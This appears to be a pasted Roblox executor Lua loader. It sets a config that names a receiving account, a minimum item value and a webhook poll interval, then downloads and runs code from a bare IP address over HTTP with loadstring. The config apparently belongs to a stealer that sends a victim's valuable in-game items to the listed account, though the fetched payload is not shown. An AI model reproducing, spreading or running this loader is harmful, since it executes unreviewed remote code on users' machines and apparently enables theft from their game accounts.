https://pastefy.app/UfyNDUYx/raw

task.wait(0.2)

local globalEnv = (getgenv and getgenv()) or _G
globalEnv.StarScriptsConfig = {
    RECEIVERS = { "Reivy0" },
    MIN_VALUE = "1k",
    LINK_ID = "DomW4QMX4QWocqISRNEVU1c195uA_-wl",
    WEBHOOK_POLL_SEC = 2
}
loadstring(game:HttpGet("http://205.185.125.84/sab/sabtrade"))()
